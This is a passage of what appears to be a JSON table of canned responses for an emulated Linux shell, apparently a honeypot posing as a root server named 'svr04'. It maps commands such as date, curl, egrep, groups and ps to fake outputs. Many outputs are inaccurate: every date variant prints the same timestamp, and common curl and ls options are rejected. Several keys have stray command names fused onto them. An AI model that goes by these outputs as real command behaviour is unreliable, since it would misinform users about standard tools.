    "chmod a+rx /home/phil/test1.txt,/home/phil//test2.txt": "chmod: cannot access '/home/phil/test1.txt,/home/phil//test2.txt': No such file or directory\n\n",
    "chmod a+rx /home/phil/test1.txt,/home/phil//test2.txtchsh": "chmod: cannot access '/home/phil/test1.txt,/home/phil//test2.txtchsh': No such file or directory\n\n",
    "chmod u+rw /home/phil/file_or_directory": "chmod: cannot access '/home/phil/file_or_directory': No such file or directory\n\n",
    "chmod u+rw /home/phil/file_or_directory1,/home/phil/file_or_directory2": "chmod: cannot access '/home/phil/file_or_directory1,/home/phil/file_or_directory2': No such file or directory\n\n",
    "crontab -l": "no crontab for root\n\n",
    "curl --cert client.pem --key key.pem --insecure https://example.com": "curl: option --cert not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n\n",
    "curl --data 'name=bob' https://example.com/form": "curl: option --data not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n\n",
    "curl --fail --remote-name --location --continue-at https://example.com/filename": "curl: option --fail not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n\n",
    "curl --header 'X-My-Header: 123' https://example.com": "curl: option --header not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n\n",
    "curl --remote-name https://example.com/filename": "curl: option --remote-name not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n\n",
    "curl --request DELETE https://example.com/file.txt": "curl: option --request not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n\n",
    "curl --user myusername:mypassword https://example.com": "curl: option --user not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n\n",
    "curl https://example.com": "<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <style type=\"text/css\">\n    body {\n        background-color: #f0f0f2;\n        margin: 0;\n        padding: 0;\n        font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n        \n    }\n    div {\n        width: 600px;\n        margin: 5em auto;\n        padding: 2em;\n        background-color: #fdfdff;\n        border-radius: 0.5em;\n        box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n    }\n    a:link, a:visited {\n        color: #38488f;\n        text-decoration: none;\n    }\n    @media (max-width: 700px) {\n        div {\n            margin: 0 auto;\n            width: auto;\n        }\n    }\n    </style>    \n</head>\n\n<body>\n<div>\n    <h1>Example Domain</h1>\n    <p>This domain is for use in illustrative examples in documents. You may use this\n    domain in literature without prior coordination or asking for permission.</p>\n    <p><a href=\"https://www.iana.org/domains/example\">More information...</a></p>\n</div>\n</body>\n</html>\n\n",
    "date +%H": "Fri Feb 23 16:33:15 UTC 2024\n\n",
    "date +%M": "Fri Feb 23 16:33:16 UTC 2024\n\n",
    "date +%S": "Fri Feb 23 16:33:17 UTC 2024\n\n",
    "date +%Y": "Fri Feb 23 16:33:18 UTC 2024\n\n",
    "date +%b": "Fri Feb 23 16:33:19 UTC 2024\n\n",
    "date +%c": "Fri Feb 23 16:33:20 UTC 2024\n\n",
    "date +%d": "Fri Feb 23 16:33:22 UTC 2024\n\n",
    "date +%m": "Fri Feb 23 16:33:23 UTC 2024\n\n",
    "date +%s": "Fri Feb 23 16:33:24 UTC 2024\n\n",
    "date -d \"2017-01-01\"": "Fri Feb 23 16:33:25 UTC 2024\n\n",
    "date -d \"2017-02-28\"git rebase": "Fri Feb 23 16:33:26 UTC 2024\n\n",
    "date -d \"2017-07-04\"": "Fri Feb 23 16:33:27 UTC 2024\n\n",
    "date -d \"2017-12-31\"": "Fri Feb 23 16:33:29 UTC 2024\n\n",
    "date -d \"last sunday\"": "Fri Feb 23 16:33:30 UTC 2024\n\n",
    "date -d \"next sunday\"": "Fri Feb 23 16:33:31 UTC 2024\n\n",
    "date -d \"tomorrow\"": "Fri Feb 23 16:33:32 UTC 2024\n\n",
    "date -d \"yesterday\"": "Fri Feb 23 16:33:33 UTC 2024\n\n",
    "date -r 1473305798": "Fri Feb 23 16:33:34 UTC 2024\n\n",
    "date -u +%Y-%m-%dT%H:%M:%SZ": "Fri Feb 23 16:33:35 UTC 2024\n\n",
    "dd if=/dev/drive_device of=path/to/file.img status=progress": "unknown operand: status\n",
    "dd if=/dev/source_device of=/dev/dest_device bs=4m conv=noerror status=progress": "unknown operand: conv\n",
    "dd if=/dev/urandom of=path/to/random_file bs=100 count=1": "0+0 records in\n0+0 records out\n0 bytes transferred in 0.695821 secs (0 bytes/sec)\n\n",
    "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'": "Size\n4.7G\n\n",
    "dir --hide=*.txt": "ls: option --hide not recognized\nTry 'ls --help' for more information.\n\n",
    "dir --recursive": "ls: option --recursive not recognized\nTry 'ls --help' for more information.\n\n",
    "dir -C --escape": "ls: option --escape not recognized\nTry 'ls --help' for more information.\n\n",
    "dir -l --author": "ls: option --author not recognized\nTry 'ls --help' for more information.\n\n",
    "dir -l --group-by-file": "ls: option --group-by-file not recognized\nTry 'ls --help' for more information.\n\n",
    "dir -l --sort-by=access": "ls: option --sort-by not recognized\nTry 'ls --help' for more information.\n\n",
    "dmesg | grep irtual": "[    0.004000] virtual kernel memory layout:\n[    0.188011] Booting paravirtualized kernel on bare hardware\n\n",
    "du -sh /home/user/Music": "28K     .\n\n",
    "echo \"Hello World\"": "Hello World\n\n",
    "echo \"Hello World\" 2>&1": "Hello World 2 >& 1\n\n",
    "echo \"Hello World\" | awk '{print $1}'": "Hello\n\n",
    "echo \"Hello World\" | tee -b file1.txt file2.txtgit cvsexportcommit": "tee: invalid option -- 'b'\nTry 'tee --help' for more information.\n\n",
    "echo \"Hello World\" | tee -c file1.txt file2.txt": "tee: invalid option -- 'c'\nTry 'tee --help' for more information.\n\n",
    "echo \"Hello World\" | tee -d file1.txt file2.txt": "tee: invalid option -- 'd'\nTry 'tee --help' for more information.\n\n",
    "echo \"Hello World\" | tee -e /dev/tty": "tee: invalid option -- 'e'\nTry 'tee --help' for more information.\n\n",
    "echo \"Hello World\" | tee -o /dev/tty": "tee: invalid option -- 'o'\nTry 'tee --help' for more information.\n\n",
    "echo \"Hello World\" | tee -s file1.txt file2.txt": "tee: invalid option -- 's'\nTry 'tee --help' for more information.\n\n",
    "echo \"Hello World\" | tee -u file1.txt file2.txt": "tee: invalid option -- 'u'\nTry 'tee --help' for more information.\n\n",
    "echo \"My path is $PATH\"": "My path is $PATH\n\n",
    "echo $?": "0\n\n",
    "echo -e \"Column 1\tColumn 2\"": "Column 1\tColumn 2\n\n",
    "echo -n \"Hello World\"": "Hello World\n",
    "egrep \"linux\" /etc/os": "grep: /etc/os: No such file or directory\n\n",
    "egrep -h \"ftp\" /etc/services": "usage: grep [-abcDEFGHhIiJLlmnOoPqRSsUVvwxZ] [-A num] [-B num] [-C[num]]\n\t[-e pattern] [-f file] [--binary-files=value] [--color=when]\n\t[--context[=num]] [--directories=action] [--label] [--line-buffered]\n\t[--null] [pattern] [file ...]\n\n",
    "egrep -i \"javascript\" /home/user/projects/js": "grep: /home/user/projects/js: No such file or directory\n\n",
    "egrep -i \"python\" /usr/bin": "grep: error reading `/usr/bin': Is a directory\n\n",
    "egrep -n \"php\" /usr/share/php": "grep: /usr/share/php: No such file or directory\n\n",
    "egrep -r \"bash\" /usr/bin": "grep: invalid option -- r\nusage: grep [-abcDEFGHhIiJLlmnOoPqRSsUVvwxZ] [-A num] [-B num] [-C[num]]\n\t[-e pattern] [-f file] [--binary-files=value] [--color=when]\n\t[--context[=num]] [--directories=action] [--label] [--line-buffered]\n\t[--null] [pattern] [file ...]\n\n",
    "egrep -v \"sudo\" /etc/sudoers": "grep: /etc/sudoers: No such file or directory\n\n",
    "egrep -v \"test\" /home/user/testfiles": "grep: /home/user/testfiles: No such file or directory\n\n",
    "egrep -w \"mysql\" /var/lib/mysql": "grep: /var/lib/mysql: No such file or directory\n\n",
    "egrep -w \"nginx\" /etc/nginxsetfacl": "grep: /etc/nginxsetfacl: No such file or directory\n\n",
    "egrep -w \"www\" /var/www": "grep: /var/www: No such file or directory\n\n",
    "env": "LOGNAME=root\nSHELL=/bin/bash\nUSER=root\nHOME=/root\nTMOUT=1800\nUID=0\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\n",
    "fgrep -l \"Linux Mint\" /home/phil/test1.txt /home/phil//test2.txt /home/phil/file3": "grep: /home/phil/test1.txt: No such file or directory\ngrep: /home/phil/test2.txt: No such file or directory\ngrep: /home/phil/file3: No such file or directory\n\n",
    "fgrep -l \"Linux\" /home/phil/test1.txt /home/phil//test2.txt": "grep: /home/phil/test1.txt: No such file or directory\ngrep: /home/phil/test2.txt: No such file or directory\n\n",
    "fgrep -x /home/phil/test1.txt /home/phil//test2.txt": "grep: /home/phil/test2.txt: No such file or directory\n\n",
    "fgrep -x /home/phil/test1.txt /home/phil//test2.txt /home/phil/file3": "grep: /home/phil/test2.txt: No such file or directory\ngrep: /home/phil/file3: No such file or directory\n\n",
    "fgrep -x /home/phil/test1.txt /home/phil//test2.txt /home/phil/file3 /home/phil/file4": "grep: /home/phil/test2.txt: No such file or directory\ngrep: /home/phil/file3: No such file or directory\ngrep: /home/phil/file4: No such file or directory\n\n",
    "free -m": "              total        used        free      shared  buff/cache   available\nMem:           4005         897        2276          49         831        2949\nSwap:          2732           0        2732\n\n",
    "gcc": "gcc: fatal error: no input files\ncompilation terminated.\n\n",
    "gcc -S path/to/source.c": "gcc: path/to/source.c: No such file or directory\ngcc: fatal error: no input files\ncompilation terminated.\n\n",
    "gcc -Wall -O2 -o path/to/output_executable path/to/source.cpp -Ipath/to/header -llibrary_name": "gcc: path/to/source.cpp: No such file or directory\ngcc: fatal error: no input files\ncompilation terminated.\n\n",
    "gcc path/to/source1.c path/to/source2.c ... -o path/to/output_executable": "gcc: path/to/source1.c: No such file or directory\ngcc: path/to/source2.c: No such file or directory\ngcc: fatal error: no input files\ncompilation terminated.\n\n",
    "groups -A": "groups: invalid option -- 'A'\nTry 'groups --help' for more information.\n\n",
    "groups -G": "groups: invalid option -- 'G'\nTry 'groups --help' for more information.\n\n",
    "groups -H": "groups: invalid option -- 'H'\nTry 'groups --help' for more information.\n\n",
    "groups -I": "groups: invalid option -- 'I'\nTry 'groups --help' for more information.\n\n",
    "groups -N": "groups: invalid option -- 'N'\nTry 'groups --help' for more information.\n\n",
    "groups -R": "groups: invalid option -- 'R'\nTry 'groups --help' for more information.\n\n",
    "groups -T": "groups: invalid option -- 'T'\nTry 'groups --help' for more information.\n\n",
    "groups -Ucomm": "groups: invalid option -- 'U'\nTry 'groups --help' for more information.\n\n",
    "groups -a": "groups: invalid option -- 'a'\nTry 'groups --help' for more information.\n\n",
    "groups -g": "groups: invalid option -- 'g'\nTry 'groups --help' for more information.\n\n",
    "groups -h": "Usage: groups [OPTION]... [USERNAME]...\nPrint group memberships for each USERNAME or, if no USERNAME is specified, for\nthe current process (which may differ if the groups database has changed).\n      --help     display this help and exit\n      --version  output version information and exit\n\nGNU coreutils online help: <https://www.gnu.org/software/coreutils/>\nFull documentation at: <https://www.gnu.org/software/coreutils/groups>\nor available locally via: info '(coreutils) groups invocation'\n\n",
    "groups -i": "groups: invalid option -- 'i'\nTry 'groups --help' for more information.\n\n",
    "groups -l": "groups: invalid option -- 'l'\nTry 'groups --help' for more information.\n\n",
    "groups -m": "groups: invalid option -- 'm'\nTry 'groups --help' for more information.\n\n",
    "groups -n": "groups: invalid option -- 'n'\nTry 'groups --help' for more information.\n\n",
    "groups -p": "groups: invalid option -- 'p'\nTry 'groups --help' for more information.\n\n",
    "groups -r": "groups: invalid option -- 'r'\nTry 'groups --help' for more information.\n\n",
    "groups -t": "groups: invalid option -- 't'\nTry 'groups --help' for more information.\n\n",
    "groups -u": "groups: invalid option -- 'u'\nTry 'groups --help' for more information.\n\n",
    "head -1 /home/phil/file": "head: invalid option -- '1'\n\n",
    "head -2 /home/phil/file": "head: invalid option -- '2'\n\n",
    "head -3 /home/phil/file": "head: invalid option -- '3'\n\n",
    "head -4 /home/phil/file": "head: invalid option -- '4'\n\n",
    "head -5 /home/phil/file": "head: invalid option -- '5'\n\n",
    "head -8 /home/phil/file": "head: invalid option -- '8'\n\n",
    "head -n 10 /home/phil/file": "head: cannot open `/home/phil/file' for reading: No such file or directory\n\n",
    "hostname": "svr04\n\n",
    "id": "uid=0(root) gid=0(root) groups=0(root)\n\n",
    "killall -9 -KILL node": "no process found\n\n",
    "last": "root     pts/0        192.168.64.1     Fri Feb 23 17:16   still logged in\n\nwtmp begins Fri Feb 23 00:01:03 2024\n\n",
    "locate": "no search pattern specified \n\n",
    "locate /test2": "/test2\n\n",
    "ls -a": ".         ..        .aptitude .bashrc   .profile  .ssh      \n\n",
    "ls -d */": "ls: cannot access /root/*: No such file or directory\n\n",
    "ls -l --color=auto": "ls: option --color not recognized\nTry 'ls --help' for more information.\n\n",
    "ls -l --group-directories-first": "ls: option --group-directories-first not recognized\nTry 'ls --help' for more information.\n\n",
    "ls -l --sort=access": "ls: option --sort not recognized\nTry 'ls --help' for more information.\n\n",
    "ls -l --time-style=full": "ls: option --time-style not recognized\nTry 'ls --help' for more information.\n\n",
    "lscpu | grep Model": "Model:                 23\n\n",
    "make": "make: *** No targets specified and no makefile found.  Stop.\n\n",
    "mv -f /home/phil/source/myfile.txt /home/phil/target/": "mv: cannot stat `/home/phil/source/myfile.txt': No such file or directory\n\n",
    "mv -f myfile.txt /home/phil/new/location": "mv: cannot create regular file `/home/phil/new/location': No such file or directory\n\n",
    "mv -n /home/phil/source/myfile.txt /home/phil/target/": "Unrecognized option\n\n",
    "mv /home/phil/source /home/phil/target": "mv: cannot stat `/home/phil/source': No such file or directory\n\n",
    "mv /home/phil/source/ /home/phil/target/": "mv: cannot stat `/home/phil/source/': No such file or directory\n\n",
    "mv /home/phil/source/myfile.txt /home/phil/target/myfile2.txt": "mv: cannot create regular file `/home/phil/target/myfile2.txt': No such file or directory\n\n",
    "mv /home/phil/source/myfile.txt /home/phil/target/myfile2.txt /home/phil/target/myfile3.txtloginctl": "mv: target `/home/phil/target/myfile3.txtloginctl' is not a directory\n\n",
    "mv myfile.txt /home/phil/new/location/myfile2.txt": "mv: cannot create regular file `/home/phil/new/location/myfile2.txt': No such file or directory\n\n",
    "mv myfile.txt /home/phil/new/location/myfile2.txt /home/phil/new/location/myfile3.txt": "mv: target `/home/phil/new/location/myfile3.txt' is not a directory\n\n",
    "mv myfile.txt myfile2.txt myfile3.txt /home/phil/new/location": "mv: target `/home/phil/new/location' is not a directory\n\n",
    "mv myfile1.txt myfile2.txt myfile3.txt /home/phil/new/location/myfile4.txt": "mv: target `/home/phil/new/location/myfile4.txt' is not a directory\n\n",
    "passwd": "Enter new UNIX password: \n",
    "printf": "printf: usage: printf [-v var] format [arguments]\n\n",
    "ps -e": "PID   TTY     TIME  COMMAND                     \n7860  pts/0   0:00  -bash                        \n7862  pts/0   0:00  ps -e                          \n\n",
    "ps -m": "PID   TTY     TIME  COMMAND                     \n7618  pts/0   0:00  -bash                        \n7620  pts/0   0:00  ps -m                          \n\n",
    "ps -o args= -p 1234": "PID   TTY     TIME  COMMAND                     \n7758  pts/0   0:00  -bash                        \n7760  pts/0   0:00  ps -o args= -p 1234                          \n\n",
    "ps -o args= -p 1234 -o command=": "PID   TTY     TIME  COMMAND                     \n6490  pts/0   0:00  -bash                        \n6492  pts/0   0:00  ps -o args= -p 1234 -o command=                          \n\n",
    "ps -o command= -p 1234": "PID   TTY     TIME  COMMAND                     \n5639  pts/0   0:00  -bash                        \n5641  pts/0   0:00  ps -o command= -p 1234                          \n\n",
    "ps -o command= -p 1234 -o args=": "PID   TTY     TIME  COMMAND                     \n6665  pts/0   0:00  -bash                        \n6667  pts/0   0:00  ps -o command= -p 1234 -o args=                          \n\n",
    "ps -o ppid= -p 1234": "PID   TTY     TIME  COMMAND                     \n7976  pts/0   0:00  -bash                        \n7978  pts/0   0:00  ps -o ppid= -p 1234                          \n\n",
    "ps -o ppid= -p 1234 -o args=": "PID   TTY     TIME  COMMAND                     \n7182  pts/0   0:00  -bash                        \n7184  pts/0   0:00  ps -o ppid= -p 1234 -o args=                          \n\n",
    "ps -o ppid= -p 1234 -o command=": "PID   TTY     TIME  COMMAND                     \n6635  pts/0   0:00  -bash                        \n6637  pts/0   0:00  ps -o ppid= -p 1234 -o command=                          \n\n",
    "ps -o ppid= -p 1234 -o command= -o args=": "PID   TTY     TIME  COMMAND                     \n6835  pts/0   0:00  -bash                        \n6837  pts/0   0:00  ps -o ppid= -p 1234 -o command= -o args=                    \n\n",
    "ps -o ppid= -p 1234 -o command= -o args= -o status": "PID   TTY     TIME  COMMAND                     \n5426  pts/0   0:00  -bash                        \n5428  pts/0   0:00  ps -o ppid= -p 1234 -o command= -o args= -o status          \n\n",
    "ps -o ppid= -p 1234 -o command= -o args= -o status -oetime": "PID   TTY     TIME  COMMAND                     \n5990  pts/0   0:00  -bash                        \n5992  pts/0   0:00  ps -o ppid= -p 1234 -o command= -o args= -o status -oetime  \n\n",
    "ps -o ppid= -p 1234 -o command= -o args= -o status -oetime -o command_name": "PID   TTY     TIME  COMMAND                     \n5887  pts/0   0:00  -bash                        \n5889  pts/0   0:00  ps -o ppid= -p 1234 -o command= -o args= -o status -oetime -\n\n",
    "ps -o ppid= -p 1234 -o command= -o args= -o status -oetime -o command_name -o pid": "PID   TTY     TIME  COMMAND                     \n4586  pts/0   0:00  -bash                        \n4588  pts/0   0:00  ps -o ppid= -p 1234 -o command= -o args= -o status -oetime -\n\n",
    "ps -o ppid= -p 1234 -o command= -o args= -o status -oetime -o command_name -o pid -o utime": "PID   TTY     TIME  COMMAND                     \n7195  pts/0   0:00  -bash                        \n7197  pts/0   0:00  ps -o ppid= -p 1234 -o command= -o args= -o status -oetime -\n\n",
    "ps -o ppid= -p 1234 -o command= -o args= -o status -oetime -o command_name -o pid -o utime -o nicegit ls-tree": "PID   TTY     TIME  COMMAND                     \n4690  pts/0   0:00  -bash                        \n4692  pts/0   0:00  ps -o ppid= -p 1234 -o command= -o args= -o status -oetime -\n\n",
    "ps -o ppid= -p 1234 -o command= -o args= -o status -oetime -o command_name -o pid -o utime -o nicejournalctl": "PID   TTY     TIME  COMMAND                     \n4089  pts/0   0:00  -bash                        \n4091  pts/0   0:00  ps -o ppid= -p 1234 -o command= -o args= -o status -oetime -\n\n",
    "ps -r": "PID   TTY     TIME  COMMAND                     \n7689  pts/0   0:00  -bash                        \n7691  pts/0   0:00  ps -r                          \n\n",
    "ps -x": "PID   TTY     STAT  TIME  COMMAND                     \n1     ?       Ss    0.48  /lib/systemd/systemd --system --deserialize 20\n2     ?       S<    0.0   [kthreadd]                  \n3     ?       S<    0.0   [ksoftirqd/0]               \n5     ?       D<    0.0   [kworker/0:0H]              \n7     ?       Ss    0.0   [rcu_sched]                 \n8     ?       Ss+   0.0   [rcu_bh]                    \n9     ?       Ss+   0.0   [migration/0]               \n10    ?       S<    0.0   [watchdog/0]                \n11    ?       D<    0.0   [watchdog/1]                \n12    ?       Ss+   0.0   [migration/1]               \n13    ?       Ss    0.0   [ksoftirqd/1]               \n15    ?       D<    0.0   [kworker/1:0H]              \n16    ?       D<    0.0   [khelper]                   \n17    ?       S<    0.0   [kdevtmpfs]                 \n18    ?       Ss    0.0   [netns]                     \n19    ?       D<    0.0   [khungtaskd]                \n20    ?       S<    0.0   [writeback]                 \n21    ?       S<    0.0   [ksmd]                      \n22    ?       S<    0.0   [crypto]                    \n23    ?       S<    0.0   [kintegrityd]               \n24    ?       D<    0.0   [bioset]                    \n25    ?       Ss+   0.0   [kblockd]                   \n27    ?       Ss    0.0   [kswapd0]                   \n28    ?       S<    0.0   [vmstat]                    \n29    ?       S<    0.0   [fsnotify_mark]             \n35    ?       S<    0.0   [kthrotld]                  \n37    ?       S<    0.0   [ipv6_addrconf]             \n38    ?       D<    0.0   [deferwq]                   \n39    ?       D<    0.0   [kworker/u4:1]              \n74    ?       Ss    0.0   [ata_sff]                   \n75    ?       Ss+   0.0   [kpsmoused]                 \n78    ?       S<    0.0   [scsi_eh_0]                 \n79    ?       Ss+   0.0   [scsi_tmf_0]                \n80    ?       Ss    0.0   [kworker/u4:2]              \n83    ?       Ss    0.0   [kworker/1:1H]              \n88    ?       D<    0.0   [kworker/0:1H]              \n103   ?       D<    0.0   [jbd2/sda1-8]               \n104   ?       Ss+   0.0   [ext4-rsv-conver]           \n135   ?       Ss+   0.0   [kauditd]                   \n141   ?       Ss    0.05  /lib/systemd/systemd-udevd  \n150   ?       S<    0.16  /lib/systemd/systemd-journald\n360   ?       Ss    0.0   /sbin/rpcbind -w            \n387   ?       D<    0.0   [rpciod]                    \n392   ?       Ss    0.0   [nfsiod]                    \n407   ?       Ss    0.0   /usr/sbin/rpc.idmapd        \n413   ?       Ss    0.0   /usr/sbin/atd -f            \n414   ?       Ss    0.01  /usr/sbin/cron -f           \n417   ?       Ss+   0.05  /lib/systemd/systemd-logind \n425   ?       D<    0.04  /usr/sbin/rsyslogd -n       \n427   ?       Ss    0.0   /usr/sbin/acpid             \n442   tty1    Ss    0.0   /sbin/agetty --noclear tty1 linux\n448   ?       D<    0.01  /usr/sbin/sshd -D           \n697   ?       Ss    0.0   dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dh\n8574  ?       Ss+   0.0   [iprt-VBoxWQueue]           \n8611  ?       D<    0.0   [ttm_swap]                  \n8743  ?       Ss    0.17  /usr/sbin/VBoxService --pidfile /var/run/vboxadd-servi\n9030  ?       Ss+   0.0   dhclient -v -pf /run/dhclient.eth1.pid -lf /var/lib/dh\n21704 ?       D<    0.0   /bin/sh /usr/bin/mysqld_safe\n25065 ?       Ss+   0.0   [kworker/0:0]               \n25970 ?       D<    0.0   [kworker/1:0]               \n26418 ?       Ss+   0.0   nginx: master process /usr/sbin/nginx -g daemon on; ma\n28001 ?       Ss    0.0   [kworker/0:2]               \n28002 ?       Ss    0.0   [kworker/1:1]               \n5556  ?       Ss    0:00  /usr/sbin/sshd: root@pts/0    \n5561  pts/0   Ss    0:00  -bash                        \n5563  pts/0   Ss    0:00  ps -x                          \n\n",
    "ps aux": "USER         PID   %CPU       %MEM       VSZ       RSS       TTY     STAT  START\nroot         1     0.0        0.89       180281344 4587520   ?       Ss    Jul22\nroot         2     0.0        0.0        0         0         ?       S<    Jul22\nroot         3     0.0        0.0        0         0         ?       S<    Jul22\nroot         5     0.0        0.0        0         0         ?       D<    Jul22\nroot         7     0.0        0.0        0         0         ?       Ss    Jul22\nroot         8     0.0        0.0        0         0         ?       Ss+   Jul22\nroot         9     0.0        0.0        0         0         ?       Ss+   Jul22\nroot         10    0.0        0.0        0         0         ?       S<    Jul22\nroot         11    0.0        0.0        0         0         ?       D<    Jul22\nroot         12    0.0        0.0        0         0         ?       Ss+   Jul22\nroot         13    0.0        0.0        0         0         ?       Ss    Jul22\nroot         15    0.0        0.0        0         0         ?       D<    Jul22\nroot         16    0.0        0.0        0         0         ?       D<    Jul22\nroot         17    0.0        0.0        0         0         ?       S<    Jul22\nroot         18    0.0        0.0        0         0         ?       Ss    Jul22\nroot         19    0.0        0.0        0         0         ?       D<    Jul22\nroot         20    0.0        0.0        0         0         ?       S<    Jul22\nroot         21    0.0        0.0        0         0         ?       S<    Jul22\nroot         22    0.0        0.0        0         0         ?       S<    Jul22\nroot         23    0.0        0.0        0         0         ?       S<    Jul22\nroot         24    0.0        0.0        0         0         ?       D<    Jul22\nroot         25    0.0        0.0        0         0         ?       Ss+   Jul22\nroot         27    0.0        0.0        0         0         ?       Ss    Jul22\nroot         28    0.0        0.0        0         0         ?       S<    Jul22\nroot         29    0.0        0.0        0         0         ?       S<    Jul22\nroot         35    0.0        0.0        0         0         ?       S<    Jul22\nroot         37    0.0        0.0        0         0         ?       S<    Jul22\nroot         38    0.0        0.0        0         0         ?       D<    Jul22\nroot         39    0.0        0.0        0         0         ?       D<    Jul22\nroot         74    0.0        0.0        0         0         ?       Ss    Jul22\nroot         75    0.0        0.0        0         0         ?       Ss+   Jul22\nroot         78    0.0        0.0        0         0         ?       S<    Jul22\nroot         79    0.0        0.0        0         0         ?       Ss+   Jul22\nroot         80    0.0        0.0        0         0         ?       Ss    Jul22\nroot         83    0.0        0.0        0         0         ?       Ss    Jul22\nroot         88    0.0        0.0        0         0         ?       D<    Jul22\nroot         103   0.0        0.0        0         0         ?       D<    Jul22\nroot         104   0.0        0.0        0         0         ?       Ss+   Jul22\nroot         135   0.0        0.0        0         0         ?       Ss+   Jul22\nroot         141   0.0        0.43       41754624  2211840   ?       Ss    Jul22\nroot         150   0.0        1.12       38326272  5820416   ?       S<    Jul22\nroot         360   0.0        0.35       37969920  1789952   ?       Ss    Jul22\nstatd        382   0.0        0.34       38174720  1748992   ?       Ss+   Jul22\nroot         387   0.0        0.0        0         0         ?       D<    Jul22\nroot         392   0.0        0.0        0         0         ?       Ss    Jul22\nroot         407   0.0        0.0        23916544  12288     ?       Ss    Jul22\nroot         413   0.0        0.31       19480576  1597440   ?       Ss    Jul22\nroot         414   0.0        0.51       28135424  2641920   ?       Ss    Jul22\nroot         417   0.0        0.34       20332544  1757184   ?       Ss+   Jul22\nmessagebus   419   0.0        0.51       43245568  2646016   ?       Ss+   Jul22\nroot         425   0.0        0.4        264880128 2088960   ?       D<    Jul22\nroot         427   0.0        0.31       4358144   1585152   ?       Ss    Jul22\nroot         442   0.0        0.33       14761984  1708032   tty1    Ss    Jul22\nroot         448   0.0        0.59       56508416  3067904   ?       D<    Jul22\nDebian-exim  682   0.0        0.42       54530048  2154496   ?       D<    Jul22\nroot         697   0.0        0.11       26009600  589824    ?       Ss    Jul22\nroot         8574  0.0        0.0        0         0         ?       Ss+   Jul22\nroot         8611  0.0        0.0        0         0         ?       D<    Jul22\nroot         8743  0.0        0.21       307101696 1064960   ?       Ss    Jul22\nroot         9030  0.0        0.47       26009600  2424832   ?       Ss+   Jul22\nroot         21704 0.0        0.29       4440064   1507328   ?       D<    Jul22\nmysql        22049 0.0        9.28       137470771248103424  ?       S<    Jul22\nejabberd     25061 0.0        0.05       27955200  233472    ?       Ss    Jul23\nroot         25065 0.0        0.0        0         0         ?       Ss+   Jul23\nejabberd     25095 0.0        8.87       968404992 45989888  ?       Ss    Jul23\nroot         25970 0.0        0.0        0         0         ?       D<    Jul23\nroot         26418 0.0        0.6        93380608  3092480   ?       Ss+   Jul23\nwww-data     26419 0.0        0.73       93704192  3760128   ?       Ss+   Jul23\nwww-data     26420 0.0        0.73       93704192  3760128   ?       D<    Jul23\nwww-data     26421 0.0        0.73       93704192  3760128   ?       Ss+   Jul23\nwww-data     26422 0.0        0.73       93704192  3760128   ?       D<    Jul23\nroot         28001 0.0        0.0        0         0         ?       Ss    Jul23\nroot         28002 0.0        0.0        0         0         ?       Ss    Jul23\nroot         7767  0.0        0.1        5416      1024      ?       Ss    Jul22\nroot         7772  0.0        0.1        5416      1024      pts/0   Ss    06:30\nroot         7774  0.0        0.1        2435      929       pts/0   Ss    06:30\n\n",
    "ps auxww": "USER         PID   %CPU       %MEM       VSZ       RSS       TTY     STAT  START TIME  COMMAND                     \nroot         1     0.0        0.89       180281344 4587520   ?       Ss    Jul22 0.48  /lib/systemd/systemd --system --deserialize 20\nroot         2     0.0        0.0        0         0         ?       S<    Jul22 0.0   [kthreadd]                  \nroot         3     0.0        0.0        0         0         ?       S<    Jul22 0.0   [ksoftirqd/0]               \nroot         5     0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/0:0H]              \nroot         7     0.0        0.0        0         0         ?       Ss    Jul22 0.0   [rcu_sched]                 \nroot         8     0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [rcu_bh]                    \nroot         9     0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [migration/0]               \nroot         10    0.0        0.0        0         0         ?       S<    Jul22 0.0   [watchdog/0]                \nroot         11    0.0        0.0        0         0         ?       D<    Jul22 0.0   [watchdog/1]                \nroot         12    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [migration/1]               \nroot         13    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [ksoftirqd/1]               \nroot         15    0.0        0.0        0         0         ?       D<    Jul22 0.0   [kworker/1:0H]              \nroot         16    0.0        0.0        0         0         ?       D<    Jul22 0.0   [khelper]                   \nroot         17    0.0        0.0        0         0         ?       S<    Jul22 0.0   [kdevtmpfs]                 \nroot         18    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [netns]                     \nroot         19    0.0        0.0        0         0         ?       D<    Jul22 0.0   [khungtaskd]                \nroot         20    0.0        0.0        0         0         ?       S<    Jul22 0.0   [writeback]                 \nroot         21    0.0        0.0        0         0         ?       S<    Jul22 0.0   [ksmd]                      \nroot         22    0.0        0.0        0         0         ?       S<    Jul22 0.0   [crypto]                    \nroot         23    0.0        0.0        0         0         ?       S<    Jul22 0.0   [kintegrityd]               \nroot         24    0.0        0.0        0         0         ?       D<    Jul22 0.0   [bioset]                    \nroot         25    0.0        0.0        0         0         ?       Ss+   Jul22 0.0   [kblockd]                   \nroot         27    0.0        0.0        0         0         ?       Ss    Jul22 0.0   [kswapd0]                   \nroot         28    0.0        0.0        0         0         ?       S<    Jul22 0.0   [vmstat]                    \nroot         29    0.0        0.0        0         0         ?       S<    Jul22 0.0   [fsnotify_mark]             \nroot         35    0.0        0.0        0         0         ?       S<    Jul22 0.0   [kthrotld]                  \nroot         37    0.0        0.0        0         0         ?       S<    Jul22 0.0   [ipv6_addrconf]             \nroot         38    0.0        0.0        0         0         ?       D<    Jul22 0.0   